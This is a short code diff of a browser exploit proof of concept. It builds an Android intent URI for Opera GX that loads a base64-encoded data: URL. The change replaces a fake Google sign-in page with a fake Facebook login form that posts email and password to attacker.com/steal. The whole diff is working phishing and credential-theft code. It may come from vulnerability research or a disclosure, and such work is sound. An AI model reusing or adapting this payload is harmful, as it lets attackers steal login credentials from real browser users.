@@ -1,16 +1,20 @@
 <script>
-const fakeLoginIntent = 
-"intent://vtp.operagx.gg/?url=" +
-"data://accounts.google.com/," +
-encodeURIComponent(`
+const base64Content = btoa(`
 <html>
-<body style="font-family: Arial; text-align: center; padding: 50px;">
-    <h1>🔒 Google Sign-in</h1>
-    <input type="email" placeholder="Email"><br>
-    <input type="password" placeholder="Password"><br>
-    <button>Sign in</button>
+<head><title>Facebook Login</title></head>
+<body>
+    <h1>Facebook</h1>
+    <form action="https://attacker.com/steal">
+        <input name="email" placeholder="Email">
+        <input name="pass" placeholder="Password">
+        <button>Log In</button>
+    </form>
 </body>
 </html>
-`) +
+`);
+
+const base64Intent = 
+"intent://vtp.operagx.gg/?url=" +
+"data:text/html;base64," + base64Content +
 "#Intent;scheme=https;category=android.intent.category.BROWSABLE;package=com.opera.gx;end";
 </script>
